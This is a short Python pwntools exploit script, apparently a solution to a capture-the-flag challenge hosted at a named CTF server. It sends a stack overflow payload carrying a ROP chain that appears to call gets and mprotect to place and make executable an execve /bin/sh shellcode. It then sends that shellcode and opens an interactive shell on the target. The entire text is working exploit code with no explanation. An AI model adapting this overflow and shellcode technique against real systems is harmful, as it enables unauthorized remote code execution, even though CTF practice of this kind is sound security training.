from pwn import *

r = remote ("ctf.j0n9hyun.xyz", 3017)
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print r.recvline()

get = 0x804f120
put = 0x80bb328

payload = "a"*28
payload += p32(get)
payload += p32(0x80bb0b8)
payload += p32(0x80eaf80)
payload += p32(0x080488a3)
payload += p32(0x806e0f0)
payload += p32(0x80bacfe)
payload += p32(0x80ea000)
payload += p32(8000)
payload += p32(7)
payload += p32(0x80eaf80)
r.sendline(payload)

r.sendline(sc)
r.interactive()
